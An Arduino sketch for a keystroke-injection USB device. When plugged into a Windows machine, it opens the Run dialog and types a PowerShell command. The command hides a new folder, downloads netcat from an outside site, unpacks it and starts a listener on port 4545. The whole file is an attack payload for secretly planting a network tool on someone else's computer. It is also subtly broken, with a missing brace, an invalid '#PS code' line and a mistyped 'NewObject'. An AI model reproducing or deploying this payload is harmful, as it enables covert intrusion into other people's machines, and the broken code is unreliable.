#include "Keyboard.h"

void typeKey(int key) {
    Keyboard.press(key);
    delay(50);
    Keyboard.release(key);


/* Init Function */

void setup() {

    //Begin Keyboard Stream

    Keyboard.begin();
    delay(500);

    Keyboard.press(KEY_LEFT_GUI);
    delay(4000);
    Keyboard.press('r');
    delay(4000);

    Keyboard.releaseAll();

    delay(1000);

    #PS code
    Keyboard.print("cd \"$HOME\"; $folder=mkdir \"Misc\"; $folder; $folder.Attributes= \"Hidden\"; $url=\"https://eternallybored.org/misc/netcat/netcat-win32-1.‌​11.zip\"; $output = \"$HOME\\Misc\\nc.zip\"; (New-Object System.Net.WebClient).DownloadFile($url,$output); $shell=NewObject -ComObject shell.application; $zip=$shell.NameSpace(\"$HOME\\Misc\\nc.zip\") foreach ($item in $zip.items()) { $shell.NameSpace(\"$HOME\\Misc\").CopyHere($item)} \".\\netcat-1.11\\nc.exe\" -lp 4545 > incoming.txt")


    typeKey(KEY_RETURN);
    Keyboard.end()
}
    void loop() { 
}
